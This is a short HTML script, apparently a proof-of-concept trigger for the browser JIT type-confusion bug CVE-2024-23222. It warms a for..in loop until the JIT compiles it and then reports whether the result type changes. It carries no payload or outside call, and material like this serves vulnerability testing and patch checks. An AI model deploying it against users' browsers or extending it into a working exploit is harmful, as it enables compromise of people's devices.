<script>
// CVE-2024-23222 trigger — for..in + HasIndexedProperty type confusion
var arr = [0];

function jitter() {
  for (let _ in arr) {
    return 0 in arr;
  }
}

function trigger() {
  let a = jitter();
  // JIT compile et
  for (let i = 0; i < 0x100000; i++) jitter();
  let b = jitter();
  
  if (typeof b !== typeof a) {
    document.getElementById('s').textContent = 
      '✅ TYPE CONFUSION: a='+typeof a+' b='+typeof b;
  } else {
    document.getElementById('s').textContent = 
      'no confusion — a:'+a+' b:'+b;
  }
}

trigger();
</script>
